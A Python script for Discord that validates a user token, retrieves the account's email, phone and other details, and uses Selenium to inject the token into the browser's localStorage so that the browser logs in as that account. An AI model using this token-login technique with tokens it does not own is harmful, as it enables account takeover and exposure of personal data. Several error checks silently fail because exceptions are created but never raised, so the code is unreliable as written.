import json
import requests
from selenium import webdriver
import os

def check_driver():
    if not os.path.exists("chromedriver.exe"):
        res = requests.get(
            "https://chromedriver.storage.googleapis.com/LATEST_RELEASE")
        ver = res.text
        download_url = "https://chromedriver.storage.googleapis.com/" + \
            ver + "/chromedriver_win64.zip"
        Exception("Driver Not Found.")

class User:
    def __init__(self, UserToken):
        self.request = requests.Session()
        self.UserToken = UserToken
        def tokeninfo(token):
            headers = {
                'Authorization': token,
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
            }
            src = self.request.get(
                'https://canary.discordapp.com/api/v6/users/@me', headers=headers, timeout=10)
            response = json.loads(src.content)
            #print(str(response))

            if src.status_code == 403:
                return "Invalid"
            elif src.status_code == 401:
                return "Invalid"
            else:
                return "Valid", response['username'], response['discriminator'], response['id'], response['email'], response['premium_type'], response['phone'], response['verified'], response['nsfw_allowed'], F"https://cdn.discordapp.com/avatars/{response['id']}/{response['avatar']}.png?size=1024"
        info = tokeninfo(UserToken)
        if (info [0] != "Valid"):
            Exception("UserToken Not Valid.")
        else:
            self.username = info[1]
            self.discriminator = info[2]
            self.ID = info[3]
            self.email = info[4]
            self.premium_type = info[5]
            self.phone = info[6]
            self.verrified = info[7]
            self.nsfw = info[8]
            self.avatar = info[9]
            if (str(self.premium_type) != "0"):
                self.premium_type = "Nitro"
            else:
                self.premium_type = "None"
    
    def Login(self):
        headers = {
            'Authorization': self.UserToken,
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
        }
        src = self.request.get('https://discord.com/api/v6/users/@me',
                        headers=headers, timeout=10)
        if src.status_code == 403:
            Exception("Token Not Valid")
        elif src.status_code == 401:
            Exception("Token Not Valid")
        else:
            opts = webdriver.ChromeOptions()
            opts.add_experimental_option("detach", True)
            driver = webdriver.Chrome('chromedriver.exe', options=opts)
            script = """
                function login(token) {
                setInterval(() => {
                document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
                }, 50);
                setTimeout(() => {
                location.reload();
                }, 2500);
                }
                """
            driver.get("https://discord.com/login")
            driver.execute_script(script + f'\nlogin("{self.UserToken}")')